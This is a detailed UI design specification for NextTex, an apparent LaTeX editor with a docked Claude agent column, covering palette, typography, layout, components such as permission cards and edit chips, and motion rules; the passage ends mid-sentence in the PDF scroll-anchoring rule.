# NextTex, Design Specification

> This document is the reference for all front-end work. It was produced before
> implementation and the built UI is reviewed against it. When the implementation
> and this document disagree, that is a bug in one of them: decide which, and
> fix that one. Do not let them drift silently.

## 1. Design direction

**The composing room.** The rendered PDF is the only white object the *app* chooses;
everything around it is the grey surround of a proofing table, and the only saturated colour
in the entire chrome is the pen the agent writes with.

> Revised. This sentence used to read "the only white object on screen", flatly, and §23
> records why it could not stay that way: a writer may now set the editor page to paper
> white, and three of them will. The rule the sentence was protecting is still the rule,
> the app is drawn on proofing grey and defaults to it, and nothing in the chrome is ever
> white, but the editor page is the one surface the writer may overrule, because the object
> it holds is the thing they are *making* rather than the thing they are *judging*. The
> claim is now about what the app picks, not about what can be on screen.

§23 also records the other half of the light theme, which is that it is no longer light all
the way through. The rail, the agent column, the status strip and everything that floats are
furniture, and they take the dark palette even while the theme is light, so the light theme
is a lit editor and a lit page set into dark furniture, rather than a cloud. This comes from the practice of judging
printed matter: you set proofs against a neutral mid-grey, never against white, because
white chrome around a white page makes the page stop reading as an object. It gives NextTex
a light theme no other code editor has, keeps the UI permanently subordinate to the typeset
page, and leaves violet free to mean exactly one thing: *Claude touched this*.

Relationship to NexusQC, the sibling app, is deliberate:

| Same hand | Different tool |
|---|---|
| One superfamily, sans + mono, no third face | Adobe Source (publishing lineage), not IBM Plex (corporate lineage) |
| CSS custom properties mapped through Tailwind `@theme inline` | Green-biased grey, not blue graphite |
| 90–180 ms durations, nothing decorative | Accent reserved for the agent, not a global primary |
| Dense 13 px instrument UI, semantic status colours | Light *and* dark, both authored; NexusQC is dark-only |

## 2. Palette

Twelve tokens per theme. `--paper` is a constant `#FFFFFF` in both themes, it is painted by
PDF.js and is never themed. `--line` and the washes are derived, not authored:
`--line: color-mix(in oklab, var(--ink-3) 55%, transparent)`,
`--pen-wash: color-mix(in oklab, var(--pen) 12%, transparent)`,
`--hint-wash: color-mix(in oklab, var(--hint) 14%, transparent)`.

| Token | Light | Dark | Use |
|---|---|---|---|
| `--surround` | `#B9BEB8` | `#0A0C0B` | App background; the field the PDF sits on |
| `--surface` | `#E3E7E2` | `#121614` | Panes: rail, editor body, chat column |
| `--surface-2` | `#D4D9D3` | `#1E2320` | Raised/inset: tab bar, status strip, hover fills, code blocks |
| `--surface-3` | `#C6CBC5` | `#2A302C` | Pressed and selected states inside a raised surface |
| `--ink` | `#141715` | `#E3E8E2` | Primary text |
| `--ink-2` | `#373B36` | `#B0B5B0` | Secondary text, user messages, consequences |
| `--ink-3` | `#4E534D` | `#909892` | Metadata, file extensions, line numbers, idle dot |
| `--pen` | `#6F2998` | `#C988E7` | Agent identity, SyncTeX highlight, active-file bar, primary button |
| `--hint` | `#00626D` | `#3FC6D2` | Live and interactive states that are *not* the agent: streaming stopped, a switch that is on, a control the eye should find |
| `--error` | `#9F1912` | `#F47365` | Compile errors, destructive hover |
| `--warn` | `#7D5300` | `#D9A539` | The preview is behind the source; chktex severity bars; permission gate bar |
| `--ok` | `#196131` | `#5ABD7B` | The preview matches the source; git clean, added diff lines, resolved-allow dot |

Two constraints govern any change to these, both arithmetic rather than taste, and
both asserted in `frontend/src/contrast.test.ts`.

**The light accents cannot be separated by lightness.** Every one of them has to
clear 4.5:1 on `--surface-2`, which caps all five at a relative luminance of about
0.11, so they sit within seven L\* of one another and always will, in any light
theme that rule governs. The separation is carried by hue and chroma instead:
violet 278°, red 3°, amber 40°, green 140°, teal 186°, each at or near the chroma
ceiling its hue allows at that lightness. Anyone reading the palette and wondering
why the light accents look so close together should stop before reaching for a
brighter value; the value is not available.

**The ink hierarchy can only be opened from the middle.** `--ink-3` sits a quarter
of a point under its own ceiling on `--surface-3` in light, and on its floor in
dark. When the three inks need more separation, and light's `--ink-2` and
`--ink-3` were once 3.5 L\* apart, two steps pretending to be three, it is
`--ink-2` that moves.

**Both themes are authored and chosen, not inherited.** A toggle in the rail
header stamps `data-theme` and the choice is remembered per browser; dark is the
default. `prefers-color-scheme` covers only the first frame before the app
stamps its own choice.

**Both are pitched darker than the original specification.** The light theme is
a proofing grey rather than a white UI, a page cannot be the brightest object
on screen if the chrome around it is also white, and the dark theme's surround
is nearly black so the sheet reads as lit.

All text tokens clear 4.5:1 on their own surface (light `--ink-3` 4.6:1, dark `--ink-3`
4.8:1, `--pen` 6.4:1 light / 6.9:1 dark).

**Neutral hue bias: green, at near-zero chroma** (2–4 points of G above R and B). Two
reasons. First, simultaneous contrast: a warm surround pushes the paper white toward cold
blue, a blue surround pushes it toward yellow; a chromatically near-dead grey leaves
`#FFFFFF` reading as paper. Second, identity, every code editor and NexusQC itself sit on
blue-grey. The bias is faint enough that nobody will call it green; they will call it grey,
and the paper will look whiter than it does in VS Code.

**Pen hue.** `#6F2998` / `#C988E7` sit at ~280–285°; NexusQC's `#6e8cff` is ~226°. Roughly
55° of separation, never confusable side by side. The colour is methyl-violet: the ink of
hectograph duplicators, which is what mid-century thesis copies were printed in. It is
explicitly *not* `#6366F1`, the indigo every AI-built app reaches for.

**The dark surround is deliberately near-black (`#0A0C0B`).** In dark mode the PDF is the
only light source, a lightbox. To make that read as a lit sheet rather than a hole punched
in the UI, the page gets a 1 px `--line` border plus `0 8px 24px rgba(0,0,0,0.55)`. In light
mode the same page gets a hairline border only, no shadow.

*The build gives it a shadow anyway*, `0 1px 4px rgba(0,0,0,0.12)`, a 4 px
ramp, and a design review flagged the disagreement. The build wins here: the
light theme is a proofing grey, and a page with a border and no shadow reads
as pasted onto the pane rather than lying on it. The rule this paragraph was
protecting, that the page is the brightest, most physical object on screen,
is better served by the shadow than by its absence.

Dark is **not** an inversion: inter-surface contrast steps are compressed
(`#0A0C0B → #121614 → #1E2320`, ~6–8 L* apart, versus ~10–12 in light), and `--ink` is
`#E3E8E2`, never `#FFFFFF`, pure white text beside a pure white PDF page is the fastest way
to make the page stop looking like paper.

## 3. Typography

Google Fonts only. One superfamily, three roles.

- **UI chrome, Source Sans 3** (400/500/600). Humanist, Adobe's publishing programme,
  drawn for small sizes, with genuine tabular figures. Not Inter.
- **Authored prose, Source Serif 4** (400/400 italic/600). Used for exactly one thing: the
  agent's replies, plus the project name in the switcher. Everything the *machine* says is
  sans; everything that is *prose about a document* is serif. Typeface becomes structure
  rather than decoration, and the chat reads as marginalia on a manuscript rather than a
  messaging app. Source Serif is Fournier-derived, so it will never be mistaken for the
  PDF's Times sitting two panes away.
- **Editor and literal machine strings, Source Code Pro** (300 to 700, upright and italic).
  Chosen over JetBrains Mono because it shares the Source skeleton, and because **it ships
  no ligatures**. That is non-negotiable for LaTeX: `--` and `---` must never fuse on screen
  when they are en- and em-dash *source*.

**Every face this app asks for is a face it has loaded.** That sounds like a truism and was
not one. The editor sets a LaTeX comment in italic, and anything the grammar calls emphasis,
and for as long as that highlighting has existed no italic Source Code Pro was imported. A
browser answers a request it cannot meet by making an oblique: the upright outline put
through a shear matrix, which loses the hinting, throws the stems off the pixel grid and
skips the corrections a drawn italic carries in its round shapes. Nothing fails when this
happens. The text is simply a little worse, for years, and the place it shows first is a
comment, which is `--ink-3` on the brightest page the app offers.

The italics are imported now at all five weights, so the ladder is the same shape upright
and slanted and there is no weight where the two disagree about whether a face exists. The
second half is `font-synthesis: none` on `.cm-editor`: with the faces present it changes
nothing, and if one is ever dropped again the text stops rather than quietly degrades.
`frontend/src/fonts.test.ts` asserts the pairing, because the failure this is guarding
against is one nobody can see.

**Grayscale antialiasing belongs to the dark palette, not to the body.**
`-webkit-font-smoothing: antialiased` sat on `body` unconditionally. It throws away
subpixel rendering, which is a third of the horizontal resolution of every stem, and dark
type on a bright ground is exactly where that costs something: the strokes thin and the
page reads washed out rather than crisp. It is declared with each palette now, the way
`--nx-editor-weight-lift` is and for the same reason, so the editor's own ground decides
for the editor while the app decides for itself. Honest about its reach: Blink and WebKit
act on this property on macOS and nowhere else, so on Linux and Windows this changes
nothing at all.

**The gutter is set at a whole number of pixels.** Its size is 0.82 of the text it numbers,
which the stylesheet used to work out itself, putting the line numbers at 11.07px at the
default size and at a fraction of a pixel at every other stop on the ladder. A glyph set at
a fractional size lays its stems across pixel boundaries, and at eleven pixels there is not
enough glyph left to survive it. `applyAppearance` rounds and stamps `--nx-editor-gutter`,
so there is no CSS feature to fall off and a whole number to assert.

**Three things were measured and left alone**, and are recorded here so they are not
measured again. `e2e/shots/text-clarity.spec.ts` renders the same comment-heavy source
across all six grounds at one and two device pixels, which is how these were decided; the
caveat in its header is that headless Chromium has no LCD subpixel antialiasing, so it
compares weight, fit and letterform honestly and subpixel rendering not at all.

- The **weight lift** of 100 on the light grounds was compared against 0 on pure white. At
  400 the prose reads thin against a page that bright, which is the effect the lift exists
  to answer, so it stands at 100 on all four light grounds.
- The **active line wash** is 7% of `--ink-3`, which darkens a bright ground where it
  lightens a dark one. On white that is `#F3F4F3`, taking the prose from 18.9:1 to 17.8:1
  on the one line being typed. That is not a legible difference and it is the conventional
  treatment; it stands.
- **13.5px** is the only fractional stop on the size ladder. 14px is crisper, and it is
  crisper because it is bigger, which is a different offer from a clearer one. The ladder is
  unchanged; the gutter above was the part of this worth fixing, because its size is derived
  rather than chosen and nobody sees the number.

**The mono rule:** monospace means "this is a literal string the machine produced or
consumes": a git SHA, `file:line`, a shell command, a log excerpt, a filename in a chip.
Merely numeric metadata (word counts, build times, diff counts) stays in Source Sans 3 with
`font-variant-numeric: tabular-nums`. No monospace as decoration.

| Role | Family | Size / line-height | Weight / tracking |
|---|---|---|---|
| `micro`: counts, badges, timestamps | Source Sans 3 | 11 / 16 | 500, `+0.004em`, tnum |
| `meta`: secondary labels, tab titles, diagnostic messages | Source Sans 3 | 12 / 18 | 400 |
| `ui`, the default: tree rows, buttons, permission headline | Source Sans 3 | 13 / 20 | 400 (500 buttons) |
| `ui-lg`: pane headings, project name | Source Serif 4 / Sans 3 | 15 / 22 | 600 |
| `prose`: agent messages | Source Serif 4 | 14.5 / 23.5 (1.62) | 400, max 68ch |
| `code`: CodeMirror | Source Code Pro | 13.5 / 1.63 | 400 plus the page's lift |
| the editor's gutter | Source Code Pro | 0.82 of the text, rounded: 11 at the default | 400 |
| `code-sm`: log excerpts, diffs, chip filenames | Source Code Pro | 12 / 18 | 400 |
| `display`: empty states, first-run setup only | Source Serif 4 | 22 / 28 | 600, `-0.01em` |

No all-caps tracked labels anywhere. Sentence case throughout, including buttons.

## 4. Layout

One `100dvh` shell, `overflow: hidden`, four columns with three drag handles. Handles are a
1 px `--line` rule with an 8 px invisible hit zone; `col-resize` cursor; double-click resets
to default; widths persist to `localStorage` per project.

| Pane | Default | Min | Max |
|---|---|---|---|
| Rail | 240 px | 180 px | 400 px |
| Editor | flex | 420 px |, |
| PDF | flex (splits remaining 50/50 with editor) | 320 px | 60% of the pair |
| Claude | 380 px | 320 px | 560 px |

**Claude is a docked column, not a slide-over, whenever there is room.** The loop this app
exists for is write → see → ask → see. A slide-over covering the PDF breaks that loop at the
exact moment the user is checking the agent's work.

Breakpoints:

- **≥ 1400 px**: all four docked, and 240 + 380 leaves 780 px for the editor/PDF pair.
- **1100–1399 px**: Claude becomes a slide-over from the right at 380 px, over the PDF,
  with an 8 px shadow and no scrim. Rail still docked.
- **< 1100 px**: rail auto-collapses.
- **< 900 px**: editor and PDF become a two-item segmented toggle, in the *tab
  bar* rather than the status strip: the strip is 26 px and already drops
  segments at that width, and a control that appears only when it has room is
  not a control. Only
  one is mounted.

**Rail collapse is to a 26 px strip carrying one label, not to an icon bar.**
This section originally said zero, and the build does not: collapsing to
nothing leaves no way back except a keyboard shortcut, which is the same hole
the agent button had. What is rejected is the *icon bar*, a 40 px activity
bar is VS Code's shape
and a default. Cmd-B hides the rail entirely; the project name then moves to the left end of
the tab bar as a non-closable chip with the switcher chevron, and the git dirty count moves
into the compile status strip as `main +4`. Nothing is lost and the editor gains 240 px.

**Spacing scale:** 2 / 4 / 6 / 8 / 12 / 16 / 24 / 32; everything quantises to 4. Interactive
row heights: 26 (tree rows, resolved cards), 28 (diagnostic rows, buttons), 32 (tabs), 26
(status strip). Pane padding 8 horizontal / 6 vertical: this is an instrument, not a
document.

**Radius is a hierarchy, not a constant:** 0 on panes and drawers, 3 px on rows, chips,
buttons and inputs, 5 px on cards. No shadows anywhere except the dark-mode PDF page and the
slide-over.

**Diagnostics live in a drawer scoped to the editor pane**, docked below the status strip:
not full-width, not inside the Claude panel. Height 0 when clean; 168 px (six rows) when
open; drag to 320 px.

**It never opens itself.** This section specified an auto-open on the first build that
produced errors, and the implementation deliberately did not do it. The build fires 1.6
seconds after you stop typing, which is very often mid-thought, and a list of errors
jumping up over the document at that moment, about a sentence you already know is
unfinished, is the most irritating thing this app could do. The strip says `2 errors` and
the gutter marks the lines; opening the drawer is the reader's decision. When it does
open, the first thing in it is the plain-English explanation of the *first* error, which
is the one worth reading.

The strip and the gutter carry the news instead, which is the general rule: say it where
the writer already is, and let them come to the detail.

## 5. Component specs

### File tree row

26 px tall. `padding-left: 10px + depth × 13px`: 13 px is the width of a Source Sans
lowercase *n* at 13 px, so indentation reads as a typographic quad rather than an arbitrary
gap. A 16 px left slot holds an 8 px chevron on folders, nothing on files.

**No file-type icons.** The filename carries its own kind typographically: stem in `--ink`,
extension in `--ink-3`, `02_theory` `.tex`. That reads as a name rather than a path and
scans faster than a colour-coded icon set.

States: rest transparent; hover `--surface-2` with no transition; **active file**
`--surface-2` plus a 2 px `--pen` bar flush against the row's left edge, full height, square;
keyboard focus a 1 px inset `--pen` outline; folder drag-over gets `--pen-wash` fill and a
1 px `--pen` bottom border. Fill radius 3 px.

Right slot (16 px), in priority order: error count in `--error` micro; unsaved dot (5 px
solid `--ink-2`); git status letter (`M`/`A`/`?`) in `--ink-3` mono 10 px. On row hover that
slot becomes a `⋯` opening, in order: rename, move to…, set as main document, history,
download, upload here, new file here, new folder here, move to trash. (This paragraph
described a menu of *rename / duplicate / download / delete / new file here* for some time
after the built menu had stopped matching it, which is the sort of drift this document
exists to avoid. Duplicate was specified and never built; it is dropped rather than left
described.) **Rename is inline**: the label becomes an input in place, same font, same
position, 1 px `--pen` underline, Enter commits, Escape reverts. Never a modal.

Drag-drop upload highlights the target folder row only, never the whole panel. The project
root has no row, so a drop aimed at it, on the empty area below the tree, or on the Files
bar: highlights the **Upload button** instead, which stands in as the root's row.

**Dragging.** A row is draggable onto any folder, and onto the Files bar for the project
root. The row being dragged drops to 50 % opacity so the gesture has a visible subject; the
folder under the pointer takes the same `--pen-wash` fill and `--pen` underline a file drop
from the desktop gets, because to the writer they are the same act. A destination that
cannot take it, the folder itself, its own descendant, or the folder it already sits in,
shows no highlight at all and the cursor says *no*: refused while it is being dragged
rather than attempted and reported.

### Reading mode and writing mode

A **double click on a pane's header gives that pane the window**, and a second double click
restores the layout exactly as it was rather than unfolding everything. A writer who had
the agent hidden before they started reading does not want it back for having read a page.
The preview's header and the source's tab strip both do this; the agent's does not, because
a column of conversation with nothing to converse about is not a mode anybody wants.

The two modes are not symmetric. **Reading folds everything but the page.** **Writing folds
everything but the source and the file list**: somebody writing is still moving between
chapters, and a mode that hides the way to the next one is a mode they leave immediately;
somebody reading the typeset page has nothing to navigate to. Writing mode brings the file
list back even at a width where the window had folded it away on its own, because asking
for the mode is an explicit request for it, and leaving the mode gives the window its
own behaviour back.

It is deliberately **not persisted**. What reaches `localStorage` is the arrangement the
writer chose, so a reload in the middle of a mode comes back to their real layout rather
than to a collapsed window with no memory of what preceded it. Folding anything by hand
ends the mode for the same reason: the layout it would restore is no longer the one they
left.

A **single click on the same headers folds that pane away**, which means one target answers
two gestures, and the fold has to wait 250 ms to find out which it is. That is the shortest
wait that does not turn a deliberate double click into a fold followed by a mode. The
agent's header, which has no second gesture, folds immediately.

**On the source pane the target is the empty run of the tab strip**, never a tab. It is the
only part of that row that is not already something, and it shrinks as tabs fill the strip
, which is the right behaviour rather than a limitation: a writer with a dozen files open
has not left themselves a place to click, and a fold they did not ask for is worse than a
gesture they have to reach the chevron for. Below 900 px, where the two panes share one
view, neither gesture exists: there is nothing to fold them into.

### Files bar

26 px, directly under the 32 px project header, and the header's bottom rule moves down
onto it so the two read as one masthead rather than two stacked bands. Fill is `--surface`,
the same plane as the tree: `--surface-2` is the tree row's own hover fill, and a permanent
band of it above rows that hover to it reads as a stuck hover.

Three controls, abutting, no gap, in the header's own button style (`quiet t-micro
h-[26px] rounded-[3px] px-2`): **New file**, **New folder**, **Upload**. A container query
shortens the first two to *File* and *Folder* below 208 px; both short forms are substrings
of the accessible name, so a spoken command matching what is on screen still works. A 22 px
magnifier sits at the right end, past the spacer, and opens the filter row below.

It exists because the alternative was a reachability hole rather than a convenience gap.
Every file operation hung off a row's `⋯` menu, so there had to *be* a row: a new project is
created as one empty document, and its first folder could only be made by opening the menu
on `main.tex` and knowing that "New folder here" resolves to the folder containing it. The
cost is one tree row of a rail that is usually 800–1000 px tall.

The bar does not grow. No collapse-all, ArrowLeft already collapses a folder.

**The filter row.** One 26 px row under the bar, shown only when the magnifier is pressed:
a full-width borderless input on `--surface-2` reading *Find a file*, with a match count in
`t-micro` at the right. Typing filters the tree to the matching rows and the folders on the
way down to them, drawing every folder open without touching what the writer had collapsed
, so clearing the box gives back the tree they had rather than one unfolded on their
behalf. Escape clears the query, and Escape again closes the row and returns focus to the
tree. Rows keep their ordinary indent and typography; there is no match highlight, because
`--pen` means *the agent touched this* and a second accent would be a new colour. A query
that matches nothing gets one `t-meta` row saying so, in the writer's own words back to
them.

### Upload chooser

A popover (`fixed`, 264 px, radius 5, `shadow-float`) rather than a modal.
`role="dialog"` without `aria-modal`, because the page behind it stays live and is not
inert; focus is not trapped, and Escape, Cancel or a click away all discard the picked
files and return focus to whatever started the upload.

This section used to say "never a modal: this app has none", and other sections cited
it. It was already untrue when it was written: access and sharing are both `aria-modal`
sheets over an `.nx-scrim`, and settings joined them when it outgrew its popover. So the
rule is narrower and it is the useful one. **A surface is modal when the thing it is
about is the whole of what you are doing**, setting a password, sharing a project,
changing how the application looks, and not otherwise. The upload chooser is not: it is
a step in an action that started in the file tree and ends there, and the tree behind it
is what the writer is choosing a destination in. A modal is also a promise that one
outside click will not both dismiss the surface and press what is under it, which is why
they are for surfaces with consequences and not for menus.

**The file picker opens first, and this appears afterwards.** Asking "which folder?" before
a file has been chosen is two deliberate steps every time; asking after means the popover
already knows the filenames, so *where* and *one of these already exists* are answered in
one surface instead of a wizard. It therefore only appears when there is something to ask:
a file dropped on a folder has named its destination by being dropped there and goes
straight in unless a name collides.

Inside: a heading naming the file or counting them; a destination row that expands a
`role="listbox"` of every folder, indented on the tree's own 13 px quad, selection following
focus, with **New folder here** below a rule as a plain button outside the list; a manifest
of one 22 px row per file, each with a `Skip` toggle; and, only when something collides, a
count, a two-button group (**Replace** / **Keep both**) and a line saying what that will do.

**Replace is the default.** The dominant case is re-exporting a figure, and it is only a
safe default because what it replaces is now kept. "Keep both" as a default quietly fills a
thesis with `plot (2).png` and then compiles the wrong one.

**Each row says the name it is about to be given.** The rows already said which files
collided and whether they would be replaced or kept, but "keeps both" does not say what
the file will be called, and the line underneath could name it only when exactly one file
collided; every other case got "The new ones come in numbered", which is the question
answered with the fact that it has an answer. The names are worked out in order, because
the answer for one upload depends on the ones before it: uploading `plot.png` and
`plot (2).png` into a folder that already holds `plot.png` gives the first of them the name
the second already has, and two rows each computed against the folder alone would both
promise `plot (2).png`.

### Editor tab

32 px tall, 10 px horizontal padding, min 96 px, max 200 px. Label at `meta` 12 px, stem
`--ink` / extension `--ink-3`; overflow truncates the **stem from the middle** so the
extension survives: `04_o-nitro…mics.tex`.

Tabs are separated by 1 px `--line` rules, not pills. The **active** tab takes `--surface`
(identical to the editor body, so it merges into the canvas), carries a 2 px `--pen` bar
along its *top* edge, and has no bottom border. Inactive tabs sit on `--surface-2` with a
1 px bottom line. A file with errors turns its extension `--error` and puts the count after
the label, as a number rather than a coloured dot, because the number says the same thing
without depending on being able to see the colour. Middle-click closes. Overflow scrolls
horizontally with a hidden scrollbar plus a 24 px chevron at the right carrying the hidden
count.

**There is no dirty state on a tab**, and this section described one for two rewrites after
it stopped being true. It said the close × was replaced by a hollow `--ink-2` ring while a
file was unsaved. A keystroke goes into the shared document as it is made and the server
writes it out a moment later, so "typed but not written" is false at every moment anybody
could look at it, and the ring it specified could never have appeared.

Tab switching is instantaneous: content swaps in the same frame, no crossfade.

**Right-clicking the tab in front opens a menu**: *Close the others*, *Close all*, a rule,
then *Duplicate*. Only the tab in front, because the items are about the file being
written and a menu on any other tab would have to say which file it meant; a right-click
anywhere else in the strip is left entirely alone, browser menu and all, since taking that
away without putting something in its place is a loss for nothing. *Close the others* is
disabled rather than absent when it is the only tab open, and the panel is `position:
fixed`, not absolute, because the strip is a horizontal scroll box and would clip it, which
is the same bug the file tree's row menu hit inside its own.

The menu does not claim `role="menu"`, and the reasoning is the file tree's: the role
promises arrow-key navigation between items, this is a column of buttons, and saying
otherwise tells a screen reader something untrue. Three other menus in the app do claim it
without implementing it, which is a real inconsistency and is in `TRACKER.md` rather than
fixed here, because the answer is roving focus in all of them.

*Duplicate* copies the file beside itself as `name (copy).ext`, the same naming rule the
trash and the upload chooser use, so there is one implementation of it and no second one
free to drift. It does not open the copy and does not move the view: a duplicate that
steals the pane is a surprise in the middle of editing the original. What it does do is
open the tree's folders as far as the copy and flash its row, because the tree opens
collapsed and a file nobody can see is a menu item that appeared to do nothing.

### Diagnostic row

28 px collapsed. Grid:
`[3px severity bar] [40px line no.] [8px] [message, flex] [file, auto] [Fix, on hover]`.

Severity bar is a 3 px full-height rule in `--error` or `--warn`: no icons, no badges. Line
number is Source Code Pro 11 px, tabular, right-aligned, `--ink-3`. Message is `meta` 12 px
`--ink`, single-line truncated. If the diagnostic is in a file other than the active one,
the filename appears at the right in `micro` `--ink-3`.

Hover: `--surface-2` fill; the left gutter reveals a disclosure chevron. Click jumps the
editor to the line and flashes it. Selected row keeps a 2 px `--pen` left bar. Expanded, the
row grows to show up to 3 lines of raw TeX log in Source Code Pro 12/18 on `--surface-2`
behind a 1 px `--line` left rule; expansion is instant, no height animation.

A `Fix` button (22 px, 3 px radius, 1 px `--line` border, `micro` label) appears on hover at
the right. It **seeds the Claude composer** with
`Fix: Undefined control sequence \citep (chapters/02_theory.tex:118)` and focuses it, it
does not send. The user always presses Enter on their own message.

**Editor gutter marker:** a 3 px severity-coloured bar filling that line's gutter cell,
aligned with the line-number column. No icon, no glyph. Squiggle is a 1.5 px dotted
underline in `--error` / `--warn` at 60% opacity: dotted, not wavy, because wavy underlines
at 13.5 px on a dense LaTeX line become visual mush.

### Agent message

Not a bubble, not an avatar. Margin-note layout: a 3 px full-height rule at the far left,
`--pen` for Claude, `--line` for the user: then a 12 px gutter, then content. Speaker is
named once at the top in `micro` sentence case (`Claude` in `--pen`), never in caps.
Timestamp appears only on row hover, `micro` `--ink-3` tabular, right-aligned.

Claude's prose is `prose` (Source Serif 4, 14.5/23.5, max 68ch). The user's message is `ui`
13 px `--ink-2` on a `--surface-2` block, 3 px radius, 8 px padding: the visual weight is
deliberately reversed from every chat app, because here the agent's output is the artefact
and the user's prompt is the annotation.

Streaming: text lands in ~50 ms batches, no per-token fade, no typewriter effect. A 2 px ×
1.1em `--pen` caret trails the text; it does **not** blink while tokens are arriving and
blinks at 1.06 s when generation pauses. Code blocks inside messages: `code-sm`,
`--surface-2`, 3 px radius, 8 px padding, no border, copy affordance on hover only. 20 px
between messages, no dividers.

### Edit chip

Sits inline in the stream, directly after the sentence that produced it. 24 px tall, 3 px
radius, `--pen-wash` fill, no border. Contents: filename stem in Source Code Pro 12 px, then
`+12 −3` in `micro` tabular (`+` in `--ok`, `−` in `--error`), then on hover `Show` and
`Undo` at the right.

Clicking the chip body expands a unified diff **in place**: max-height 220 px, scrollable,
Source Code Pro 12/18, added lines on `--ok` at 10%, removed on `--error` at 10%, 1 px left
rule, line numbers `--ink-3`. Expansion is instant.

**The connective move:** hovering a chip flashes the corresponding line range in the editor
with `--pen-wash` for as long as the hover is held. That is the cheapest way to answer
"where did it do that" without leaving the chat.

Multiple edits to one file in a single turn collapse into one chip with net counts,
expanding to a grouped diff. `Show` on a file that is not open opens it in a tab, scrolled
to the range, without stealing focus from the composer.

**Undo is a reverse patch, and the spec says what happens when it cannot apply.** While the
patch applies cleanly, `Undo` is live. If the user has typed inside that range since, the
chip drops `Undo`, keeps `Show`, and the hover hint reads `Changed since, can't undo
cleanly`. On undo, the chip collapses to a 20 px struck-through line, `Reverted,
methods.tex`, `--ink-3`, with a `Redo` link live for 10 s. The reverted chip then **stays
in the transcript permanently**. The chat is a record of what was done to the manuscript;
nothing in it ever disappears.

### Resolved permission

One 26 px row, `stream-indent`, a 6 px dot and a `t-micro` line in `--ink-3`. Three states,
not two: `--ok` for what a person allowed, `--ink-3` for what they refused, and `--warn` for
what was allowed without anybody being asked: a rule set earlier, or automatic approval.
An action nobody was asked about is not the same as one the writer allowed, and the record
must not read as though it were. The command itself stays in `t-code-sm`, as it is
everywhere else.

### Permission card

Inline in the stream, not a modal, but it blocks: the composer disables and reads `Waiting
on your approval` in `--ink-3`. Card is `--surface-2`, 1 px `--line` border, 5 px radius,
12 px padding, with a 3 px **`--warn`** left bar. Warn, not pen: this is a gate, not the
agent talking.

1. **Headline**, `ui` 13 px `--ink`, active voice, plain English: `Run a shell command` /
   `Delete figures/old_scan.png` / `Write outside the project`.
2. **The literal thing**, Source Code Pro 12 px on an inset `--surface` block, 8 px padding,
   3 px radius, wrapped, 6 lines then scroll.
3. **Consequence**, one line, `meta` `--ink-2`, only when it is not obvious: `Removes every
   build artefact in build/.`
4. **Buttons**, 28 px, 6 px gap: **Allow** (`--pen` fill, `#FFFFFF` label, 3 px radius,
   13 px/500) · **Allow always** (ghost, 1 px `--line`, `--ink`) · **Deny** (ghost,
   `--ink-2`; on hover label → `--error`, border → `--error`). Keyboard hints `A` / `⇧A` /
   `D` appear in `micro` `--ink-3` inside the buttons when the card holds focus.

`Allow always` shows its scope on hover in `micro` `--ink-3`: `Remembers: shell commands
starting with latexmk`. Scoped by command prefix, never a blanket grant.

**350 ms input shield.** For 350 ms after mount the buttons ignore clicks and keys, at full
opacity, with no visible change. It is the one place in this app that accepts added latency:
a card appearing under a cursor already travelling toward the composer must not be able to
approve `rm -rf` on the way past.

Resolved, the card collapses to a 26 px line, `Allowed, ran latexmk -C`, `--ink-3`, with
an `--ok` dot for allowed and an `--ink-3` dot for denied, and stays there forever.

### Compile status strip

26 px, full width of the editor pane, docked at its bottom above the diagnostics drawer.
`--surface-2`, 1 px `--line` top border, `micro` tabular `--ink-2`, 10 px horizontal padding.
Segments are separated by 12 px of space and a 1 px × 10 px `--line` vertical rule, **never
a middle dot**.

Left, a 6 px dot plus one word:

| State | Dot | Label |
|---|---|---|
| idle | 1 px `--ink-3` ring, hollow | `Ready` |
| compiling | solid `--pen` | `Compiling` |
| ok | solid `--ink-3` | `Built 1.06s` |
| warnings | solid `--warn` | `2 warnings` (click opens drawer) |
| errors | solid `--error` | `3 errors` (click opens drawer) |

**A clean build renders in no colour at all.** Green for success is the reflex, and it means
the strip lights up on every keystroke-triggered rebuild, dozens of times an hour,
training the user to ignore it. `--ok` is spent on git and permissions, where it fires
rarely and means something. Success here is the *absence* of colour, which makes `--warn`
and `--error` the only things that ever catch the eye.

A 2 px indeterminate `--pen` hairline is pinned to the strip's top edge during compiles,
**but only if the compile passes 400 ms.** A 1 s task with an instant spinner reads as slow;
a 1 s task where the indicator never appears reads as instant. On completion the hairline is
removed with no exit animation.

Centre: `chapters/02_theory.tex` (mono 11 px) · rule · `Ln 118, Col 24`. Right: `8,412
words`, click toggling chapter ⇄ document scope, and a rebuild affordance that appears only
on strip hover.

**The strip never reflows.** Every numeric field is tabular with a reserved min-width, so
digits changing during a compile shift nothing. A status bar that jitters makes the whole
app feel loose.

### Git section (rail footer)

Docked to the rail bottom, 1 px `--line` top border, max three rows: branch in Source Code
Pro 12 px with `↑2 ↓0` in `micro`; `4 files changed` in `--ink-2`, click expanding an inline
list of dirty paths; a 26 px `Commit and push` button. Clean state shows `main` with an
`--ok` dot and no button. First run replaces all of it with one 5 px-radius card, `Back
this up to GitHub` / `Set up`: dismissible, and once dismissed or configured it never
returns.

## 6. Motion

Durations: **0 / 90 / 120 / 180 ms**. Nothing exceeds 180 ms. Easing is
`cubic-bezier(0.22, 0.61, 0.36, 1)` everywhere; there is no second curve.

**Does not animate, 0 ms, deliberately:** pane resize while dragging (the pane must be
welded to the cursor); tab switching and editor content swaps; file tree expand/collapse (a
150 ms accordion on a chapter folder is the single most sluggish-feeling thing an editor can
do); diagnostic row expansion; edit-chip diff expansion; PDF re-render and page paint; every
status strip text and dot change; row hover fills (hover feedback that fades is hover
feedback that lags); streaming text.

**Animates:**

| What | Duration | Why |
|---|---|---|
| Permission card entry: opacity 0→1, `translateY(2px)` | 90 ms | It interrupts; it should be seen arriving, not blink into place |
| Slide-over Claude panel, `translateX` | 180 ms | Shows where it came from and where it goes back to |
| Edit-chip collapse on undo (height) | 120 ms | Shows the reversal actually happened |
| SyncTeX highlight rectangle, fade out | 700 ms | Long enough for the eye to find it after a jump |
| Compile hairline (indeterminate sweep) | 900 ms loop, appears only after 400 ms | |
| Streaming caret blink | 1.06 s, only while paused | |

No toasts. No skeletons. No shimmer. No spinners anywhere. No hover lift, scale, or shadow
on any card. No page-turn animation in the PDF.

`prefers-reduced-motion: reduce` collapses every transform and height transition to 0 ms and
keeps opacity changes at 90 ms.

**Anti-jump rule for the PDF**, which is a motion decision even though nothing animates:
scroll position is anchored to *page index + normalised offset within that page*, not to a
pixel `scrollTop`, so a rebuild that changes the page count does not slide the view. The new
document renders into an offscreen canvas layer and swaps in a single frame: the pane is
